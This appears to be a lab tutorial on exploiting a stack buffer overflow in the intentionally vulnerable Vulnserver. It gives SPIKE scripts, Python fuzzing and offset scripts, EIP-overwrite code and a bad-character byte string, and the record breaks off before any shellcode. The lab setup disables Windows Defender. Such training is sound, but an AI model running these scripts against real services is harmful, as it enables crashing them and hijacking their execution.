
### Intro

- Anatomy of the Memory
- Anatomy of the Stack
- Buffer Overflow Walkthrought

### Anatomy of Memory

![image](https://user-images.githubusercontent.com/94720207/169180891-ba8923c4-2493-4ec7-b1b9-00f7d41c9e7c.png)

- We will be focusing on the stack

### Anatomy of the Stack

![image](https://user-images.githubusercontent.com/94720207/169181017-6f10103d-2a74-4fc3-8019-c58f75f6c460.png)

- Buffer characters

![image](https://user-images.githubusercontent.com/94720207/169181180-421ba203-1f62-43f9-b4f8-a3e3f447bcd5.png)

- Buffer Overflow

    - Reaching the EBP & EIP:
      
![image](https://user-images.githubusercontent.com/94720207/169181279-72b722a1-fb3f-4e3b-af8f-e06b649d71d2.png)

### Steps to conduct a buffer overflow

1. Spiking - Method to find vuln part of the program
2. Fuzzing - Send a bunch of characters and see if we can break it
3. Finding the Offset - At what point did we break it
4. Overwriting the EIP - Overwriting the Poiting Address and control it
5. Finding Bad Characters - ...
6. Finding the Right Module - ...
7. Generating Shellcode - Once we know the bad characters and right module we can generate a shellcode
8. Root!

### Tools for the Buffer Overflow Lab

1. Victim Machine: Windows 10 Pro
2. Vulnerable Software: [Vulnserver](https://github.com/stephenbradshaw/vulnserver) Direct Download: [.zip fz3r0 Sp3ci4l :D DOWNLOAD!](https://github.com/Fz3r0/Fz3r0/files/8721984/vulnserver.zip)
3. Attacker Machine: Kali Linux
4. Debugger: [Immunity Debugger](https://debugger.immunityinc.com/ID_register.py) Direct Download: [.zip fz3r0 Sp3ci4l :3 DOWNLOAD!](https://github.com/Fz3r0/Fz3r0/files/8722812/immunity.debugger.zip)

- **Setup**
    
    - Run Windows 10 as Base OS (TURN OFF WINDOWS DEFENDER)
    - VMware Pro Running Kali Linux

---

### Spiking

1. Run vulnserver.exe as Administrator
2. Run Immunity Debugger as Administrator

    - On Immunitu Debugger:

        1. File > Attach > Vuln Server 
            - ![image](https://user-images.githubusercontent.com/94720207/169189657-1fc8ab40-54e7-4323-81af-f6dbb9897d29.png)

            - ![image](https://user-images.githubusercontent.com/94720207/169189603-5ebfccbf-18e9-4439-86d4-aa79ebd7cbc4.png)
        2. Press Play!
        3. Running and ready to go! _(Bottom Right Corner)_
       
            - ![image](https://user-images.githubusercontent.com/94720207/169189986-6b8b761f-a087-4c14-90c2-e9d21eff2a81.png)

3. Run Kali Linux

    - On Kali Linux:

        1. Connect to VulnServer:
        
            - Using the IP Address of the Windows Machine **192.168.10.100** + VulnServer Port **9999** (Default)
            
            - ![image](https://user-images.githubusercontent.com/94720207/169188519-02fab4e5-91e4-4272-a788-9239ad878c4a.png)
           
            - On Kali: `nc -nv 192.168.1.100 9999`
            
            - ![image](https://user-images.githubusercontent.com/94720207/169188968-e1437e10-af9f-4077-a6a7-8356bfe557e4.png)

- **It looks that this program `Vuln Server` take `commands` based on what you type AKA `strings`**

- **Spoiler Alert: TRUN command is vulnerable, but how to know it?!**

    - **To find the vulnerability we do something called `spinking`**
    
    - For example:
    
        - Let's take a command like `STATS` (first on the list)
        - I want to try to send a bunch of characters (like "A") and try to overflow it. 
        - **If we can overflow the command, then the program will `crash`** 
        - **If the program crash, then it's mean it's vulnerable!**
        - _If the command is not vulnerable then we move to the next one..._
    
    - To compare how a vulnerable command looks like VS a non vulnerable command we will compare `STATS`(not vuln) VS `TRUN` vuln, that's the way we will learn how to identify the difference. 

- For spiking we will use a tool called:

    - **`generic_send_tcp`** 

        - Usage:
        
            - `**./generic_send_tcp host port spike_script SKIPVAR SKIPSTR**`
            
| **Instruction**        | **Result**                 |
|------------------------|----------------------------|
| **./generic_send_tcp** | Command                    |
| **host**               | (Target) 192.168.1.100     |
| **port**               | (Target) 9999              |
| **spike_script**       | (Spike File) something.spk |
| **SKIPVAR**            | ()0                        |
| **SKIPSTR**            | ()0                        |

---

### Spike Script

- We will generate a file called "stats.spk"

```
s_readline();              <<<-----| 1. We will read the line
s_string("STATS ");        <<<-----| 2. We will take the string (STATS in this case)
s_string_variable("0");    <<<-----| 3. We will send a variable to the "STATS" string
```

- The trick for the spike is this:
    
    - **We will send variables in all different forms and itterations, for example 1000 at a time, 10K at a time, 100K at a time, etc...** 
    - We do this because we are looking for something to break the program! "Buscando la aguja en el pajar"
    
        - **Spike is sending all kind of different characters randomly to try to break this part of the program**

- Essentialy we can do that exact same process for all the commands, but instead `s_string("STATS ");` it will use another different command like "TRUN": `s_string("TRUN ");` 

- And here are all the spikes for `STATS` & `TRUN`:

- **STATS**

``` 
s_readline();
s_string("STATS ");
s_string_variable("0");
``` 

- **TRUN**

``` 
s_readline();
s_string("TRUN ");
s_string_variable("0");
``` 

- Save both as `stats.spk` & `trun.spk`

    - ![image](https://user-images.githubusercontent.com/94720207/169211415-d71051aa-2aa2-4955-a50c-c959b4e49dde.png)

- Sending the `STATS spike` from Kali (Attacker) to the Target program (Vuln Server):

    - `generic_send_tcp host port spike_script SKIPVAR SKIPSTR`
    
    - `generic_send_tcp 192.168.1.100 9999 stats.spk 0 0`
    
        - The tool starts to spike Vuln Server:
        
        - ![image](https://user-images.githubusercontent.com/94720207/169212389-fa99d1f6-d8e8-4a62-bdaa-d944fd3a3fa6.png)
        
        - ![image](https://user-images.githubusercontent.com/94720207/169218143-3a9dec2d-88fa-477d-9f05-c6f5a6ffce6b.png)
        
        - We can see the program running and recieveng threads (not crashing at all and running normal)
        
        - ![image](https://user-images.githubusercontent.com/94720207/169212162-686702c2-75f5-4c72-a2cc-9d0666ef3a89.png)

    - **We waited until the end and it never crashes, it means: STATS IS NOT VULNERABLE**
 
- Doing the same with TRUN: 

    - `generic_send_tcp host port spike_script SKIPVAR SKIPSTR`
    
    - `generic_send_tcp 192.168.1.100 9999 trun.spk 0 0`

        - The tool starts to spike Vuln Server:
        
        - ![image](https://user-images.githubusercontent.com/94720207/169216745-aa7f7fe6-a98b-4469-9434-b9d9e258ef45.png)
        
        - ![image](https://user-images.githubusercontent.com/94720207/169216923-7ebf1fc5-b09f-4fa6-bd7f-ade0696143f7.png)

        - We can see the program running and recieveng threads (CRAAAASHHHHH!!!)
        
        - ![image](https://user-images.githubusercontent.com/94720207/169217034-ed973f4b-51c5-4c7d-bc69-e267b0ab93ba.png)

    - **We crashed it! That means: `TRUN` COMMAND IS VULNERABLE!!!**
    
- If we look closer THE `Registers` we can find that we sent the `TRUN` command with a bunch of "A" 

    - ![image](https://user-images.githubusercontent.com/94720207/169220715-4fcb460b-1346-4447-9122-39b04009c37c.png)

- Remembering the buffer space... in a "perfect world" this line **"TRUN+AAAA..."** would fit exactly the buffer space...
    
    -  somehting like:

        - ![image](https://user-images.githubusercontent.com/94720207/169220829-afd4a106-a004-47eb-ba55-506b12573f50.png)

- But, we actually overflowed it after that with more "A's" after:

    - ![image](https://user-images.githubusercontent.com/94720207/169221396-5559c058-b227-4791-b96d-852e6b44a144.png)

1. If we look at `EBP` we can see `41414141`: **THA'TS THE HEX CODE FOR: `AAAA`**

    - ![image](https://user-images.githubusercontent.com/94720207/169456840-ea5ceb0a-f6e7-4e77-84e8-a05bccb3d38f.png)

2. Also, we went over `ESP` with **a bunch of "A"**

3. Finally, we get into `EIP` too with `41414141`: **THA'TS THE HEX CODE FOR: `AAAA`**

    - Something like this:

        - ![image](https://user-images.githubusercontent.com/94720207/169222216-273e11d9-35c1-4f9b-b715-0386318b046f.png)

- Remember: **The `EIP` is the important factor!**

    - If we control `EIP` we can point somethin malicious! But for that, we need to locate "where's `EIP` now?"

- NOTE: The program has crashed, so we will need to restart the `Vuln Server` and attach it again to the `Immunity Debugger`

    - **It's better to close everything and start from 0 to avoid errors** 

---

### Fuzzing

- Fuzzing is very similar to spiking:

    - We will try to send a bunch of characters at a specific command and try to break it... 
    - The difference is that we already know which command is vulnerable (`TRUN`) 

- It's time to present...the python script for Fuzzing ahhhhhh (monk chant):

```python
#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
        try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('192.168.1.100', 9999))
                
                s.send(('TRUN /.:/' + buffer))
                s.close()
                sleep(1)
                buffer = buffer + "A"*100
        
        except:
                print "Fuzzing crashed at %s bytes" % str(len(buffer))
                sys.exit()
```

- You can call it something like: `l.py`

    - **IMPORTANT: You need to chmod +x to make it executable** 
    
    - ![image](https://user-images.githubusercontent.com/94720207/169233444-86a86f86-205e-405b-9972-8f69a75d365a.png)
 
- Now, I will comment it line by line:

```python
# We declare we are using python:
#!/usr/bin/python

# We import sys & socket modules, so we can pull specific IPv4 & Port
# For example, for using "socket" & "connect" commands
import sys, socket

# We import from sleep module, only the "time" command
# We will use it for wait 1 second "sleep(1)"
from time import sleep

# Declaring a "buffer" variable
# Inside "buffer" variable, we have 100 A's (one hunded "A")
buffer = "A" * 100

# While True, we will loop and try something:
while True:
        try:
                # Try to connect to this socket:
                    # socket.AF_INET = IPv4
                    # socket.SOCK_STREAM = PORT
                    
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('192.168.1.100', 9999))
                
                # Once we've connected, we will send a "TRUN" command plus:  "s.send(('TRUN /.:/' + buffer))"
                
                    # We are using TRUN because we know is the vulnerable command in this case.
                    # The registers /.:/ are the strings that the command needs to "understand" the command (those appear in the string of the Regs in Immunity Debugger)
                    # + buffer: We are adding the buffer variable "A * 100", so...
                        
                        # WE ARE SENDING: TRUN /.:/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
                        
                    # Then, we are closing the connection with "s.close()"
                    
                    # Then, we sleep for 1 second the program with "sleep(1)"
                    
                    # Finally, we add to the variable "buffer" other A*100, so now, it will send 200...
                    
                    # The loop repeats: 100,200,300,400,500,600... the buffer will get bigger and bigger until the program breaks.
        
        # THE TRICK IS, WE ARE TRYING TO NARROW DOWN WHERE THE PROGRAM IS BREAKING AND WITH WHICH SPECIFIC BYTE SIZE.
        # SO, WE GOING TO FUZZ IT:
                                                        
                s.send(('TRUN /.:/' + buffer))
                s.close()
                sleep(1)
                buffer = buffer + "A"*100

        # WHEN IT BREAKS, IT WILL PRINT AN EXCEPTION SHOWING EXACTLY WHERE IT CRASHED:
        
        except:
                print "Fuzzing crashed at %s bytes" % str(len(buffer))
                sys.exit()
```

- **Time to fuzz!!!**

    - We only need to execute the python script `l.py` **NOTE: This script was made for python2**:
    
        - ![image](https://user-images.githubusercontent.com/94720207/169234404-7e47cdfc-38d0-440d-8679-7cbe005e50b3.png)

    - We can see the connections coming to the Vuln Server **(everytime with 100 more bytes or "A's")**:  
    
        - ![image](https://user-images.githubusercontent.com/94720207/169234708-0ef2edc7-e501-40bb-a830-aa4ec14aef3e.png) 
    
    - We can watch Immunity Device until the crash, it will happen soon or later: 
    
        - ![image](https://user-images.githubusercontent.com/94720207/169235297-527abfaf-258b-4f4f-871e-76e7cc793330.png)
    
    - Finally, we go back to our Kali and `ctrl+c` the script to force stop
    
    - We can see we have crashed it **somewhere around 2700 bytes**:
    
        - ![image](https://user-images.githubusercontent.com/94720207/169239179-c998f771-843b-4476-b633-4caf0eb23ffd.png)
     
- Let's look at the crash in the `Immunity Debugger`:

    - ![image](https://user-images.githubusercontent.com/94720207/169236414-9e00a545-bce7-4c71-88d4-6086e8a64077.png)

- We can see the bunch of "A" and the crash, but EIP seems good and we did't overwrote it...

- It's ok, we just need to know aprox where we crashed the program, and we know is somewhere around **2700 bytes**

    - Now, that we know that the crash is somewhere aroung 2700 bytes, we need to know: **where's the `EIP` value at?**

    - Remember, controlling the `EIP` is the puprose of all of this attack. 

--- 

### Step4 - Finding the Offset

- First of all, restart everything because the last crash...

- We are going to be looking for where the overwirte the `EIP`: 

    - Because controlling EIP means control the shellcode of the program (so we can send malicious scripts like a reverse shell).
    
- **For this step, we will use the tool `pattern_create` by Metasploit:**

- ![image](https://user-images.githubusercontent.com/94720207/169311872-83277c19-e042-4cab-8b48-197682ac4d15.png)
 
    - In Kali machine (-l is for lenght):
    
        - `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000`
    
    - Why 3000? Because we already found that the crash is somewhere around `2700` when we were fuzzing the program, so I round the number to 3000.
    
    - After we press "enter", we going to generate a crazy code:
    
        - ![image](https://user-images.githubusercontent.com/94720207/169313375-a585552c-60c0-4442-898f-7ae3972f9842.png)

    - We only need to copy that code and modify the `l.py` that we made on last task.
    
    - We can make another file called `2.py` with the modification.
    
        - **We need to change the `buffer` variable for the `offset` variable.**
        
        - **And instead of A * 100, we will place the code of the offset we got from `pattern_create`:**
        
        - **I've also removed the "sleep" and "buffer" addition lines** 
        
            - **At the end it looks like:** 
        
```python
#!/usr/bin/python
import sys, socket
from time import sleep

offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9"

while True:
        try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('192.168.1.100', 9999))
                
                s.send(('TRUN /.:/' + offset))
                s.close()
        
        except:
                print "Error connecting to server"
                sys.exit()
```

- When we send that crazy string we going to get the value on the `EIP` like magic, but how it works?

    1. We send the "crazy code" and we know that in some point it will crash (because it have more than **2700** characters).
    
        - **That "crazy code" is actually a pattern alogythm of characters, so Metasploit can identify the bytes where the crash exactly happened! booom!!!**
    
    3. After the crash, we going to say to Metasppoit:
    
        - **The program have crashed with the `pattern_create`, identify exactly where it crashed, plz! :3.**    

- Don't forget to change the mod `chmod +x` for running the program:

    - ![image](https://user-images.githubusercontent.com/94720207/169320429-186eefad-3311-4987-8e3c-8c5922879dee.png)

- Run it!

    - ![image](https://user-images.githubusercontent.com/94720207/169321204-855e748c-f018-4ba8-a24d-5dd530588b81.png)

- It throw the exceptions right away, and if we look at the `Registers` we see the following:

    - ![image](https://user-images.githubusercontent.com/94720207/169322452-d1136b77-ecbf-4ed6-86c6-5e9ac5697f22.png)
    
    - Just like in fuzzing: We sent _"TRUN /.:/ Cr4zyCodeCr4zyCodeCodeCr4zyCode..."_ (instead of A's) and matched "the perfect world"
    - We also overwrite `ESP`, `EBP` and `EIP`.
    - It's very similar to the A's, **but in this case we used the Metasploit character `pattern_creator` AKA "the crazy code"**
    
        - NOTE: We can know that we passed by far the crash zone (just like with A's) because we can see a large string on ESP-
        - Remember!: 
        
            1. The perfect world is the large string in `EAX`
            2. Any other large string means that we overwrite that register (`ESP`) by a looooot of chars 
            3. But, the important thing here is that we overwrite `EIP`
        
        - ![image](https://user-images.githubusercontent.com/94720207/169325948-8d363ba3-1ece-4a11-9c57-c1eecd427e51.png)
        
            - **The important and critic value here then is the `EIP`:**
            
                - **`386F4337`** 
                            
            - Let's use this value to abuse the vulnerability!

- This step is similar to the last one, but instead of using `pattern_create` tool, we will use `pattern_offset`:

- ![image](https://user-images.githubusercontent.com/94720207/169327203-1bd951d1-a149-4e20-ba65-cecb5cad7020.png)

    - In Kali machine (-l is for lenght), (-q is for query, our finding of the exact **pattern**):
    
        - `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337`
   
    - After we press "enter", we should find a **pattern offset**:
    
        - ![image](https://user-images.githubusercontent.com/94720207/169356829-c9ce74af-bce2-488b-abe1-e530f8b63684.png)

    - **Now we know that the exact offset value si `2003`** but how?
    
        - Metasploit just searched between the 3000 pattern the pattern which match exactly "386F4337"
        - That exact pattern started just at `2003 bytes`, like a "crossover" ot better said: the offset
        
            - **This information is critical, because this means that exactly at 2003 bytes, we can control `EIP` overwriting it**

---

### Overwriting the EIP

- We know that the offset for make the program crash and point exactly to the `EIP` is at `2003 bytes`.

    - **That means, `2003 bytes` just before to get to the `EIP`**
    
    - **The `EIP` itself is `4 bytes` long** 
    
- So, we going to overwrite this specific `4 bytes`! ;) 

    - Again, We only need to copy that code and modify the `l.py` or `2.py` that we made on past tasks.
    
    - We can make another file called `3.py` with the modification.
    
        - **We delete de "offset" variable, we don't need it anymore.**
        
        - **And instead of "offset" we will place "shellcode" variable.**
        
            - **"shellcode" variable will be = "A" * 2003 + "B" * 4**

```python
#!/usr/bin/python
import sys, socket
from time import sleep

shellcode = "A" * 2003 + "B" * 4

while True:
        try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('192.168.1.100', 9999))
                
                s.send(('TRUN /.:/' + shellcode))
                s.close()
        
        except:
                print "Error connecting to server"
                sys.exit()
```

- Again, same change mode process:

    - ![image](https://user-images.githubusercontent.com/94720207/169357234-54d0f78f-32b7-47c2-99c7-803a841faa03.png)
 
- With this change adding the "shellcode" variable this is what happen: 

    - **We replaced what we sent before (crazy code) and now we are sending 2003 A's (2003 bytes) + 4 B's (4 bytes)**
    
    - At the moment the shellcode is only A's and B's, but it can get malicious! 
    
        - **We send 2003 A's, because at 2003 bytes is where the `EIP` offset starts**
        
        - **This means, just at 2004 bytes, `EIP` starts itself, using 4 bytes (B's)**
        
        - **So, the idea here is filling the exact value we need to reach the offset with A's, and then fill `EIP` with B's, so we can identify where is exactly `EIP` located at the memory**
        
            - **Something like: 
            
                - _buffer_ ...**AAAAAAAAAAAAAAAAAAAAAAAAAAAA** <|EIP Starts|> **BBBB** <|EIP Endss|> _outside_**
                
                - ![image](https://user-images.githubusercontent.com/94720207/169358167-6936c801-2f6b-423d-bbbb-fe2811395a9e.png)
                    
        - So! in theory when we run the script, we need to see the value of HEX `BBBB` in `EIP`:
        
            - HEX "B" (_Mayus B_) = `42`
            
            - **HEX "BBBB" = `42424242`**
        
        - Let's run it! que chille! 
        
            - ![image](https://user-images.githubusercontent.com/94720207/169361983-02f9bfaf-7f5f-436c-8959-9ebfe68c5ba8.png)
         
            - It crashes instantly after I run it (stop with `ctrl+c` again) 
            
            - And this is how it looks our precious `BBBB` or `42424242` in the `Immunity Debugger`:
       
            - ![image](https://user-images.githubusercontent.com/94720207/169362232-8ebe4838-7514-47b2-8459-f0b776f0421c.png)
            
            - ![image](https://user-images.githubusercontent.com/94720207/169358167-6936c801-2f6b-423d-bbbb-fe2811395a9e.png) 
            
            - **Boooom!!!** 
            
    - **We succesfully overwritten the `EIP` and we have control of it**, but just with an inocent "BBBB" (4 bytes)...
    
        - **It's time to overwirte it with some malicious shellcode containung a 4 bytes of deadly poison!**  

---

### Finding Bad Characters

- When we generate a `shellcode` we need to know what are the `good characters for the shellcode` and the `bad characters for the shellcode`.

    - We can do that by running **ALL THE HEX CHARACTERS** throught our program and see if any of them act up.
    
    - By default, the `Null Byte` : `x00` acts up
    
    - ![image](https://user-images.githubusercontent.com/94720207/169364386-bed635cb-9074-4648-8e94-3692e5cf79d7.png)

- So, we going to see how it's look like and if any of this `bad characters` act up in the program (Vuln Server)

    - If you google-fu `badchars` or follow [this link from bulbsecurity](https://www.bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/) (view page source for copy/paste it Mr. Hacker :P) or just use this:
    
```
badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
```

- Then, we will copy the badchars code _(you can include badchars = for now, but don't forget to dfelete it!!!)_ to a new python script (or re-use the same of last task)

    - Again, We only need to copy that code and modify the `l.py` or `2.py` or `3.py` that we made on past tasks.
    
    - We can make another file called `4.py` with the modification.
    
        - **We add before the `shellcode` variable a new `badchars` variable**
        
        - **We copy/pase all the `badchars` code into the variable**
        
            - Now, remember the `Null Byte` = `x00`? we will delete it (from the beginning of the code) and clean all the code (delete "badchars =")
            
        - **And finally, we add "+ badchars" to the `shellcode` line: `shellcode = "A" * 2003 + "B" * 4 + badchars`** 
 
```python
#!/usr/bin/python
import sys, socket
from time import sleep

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
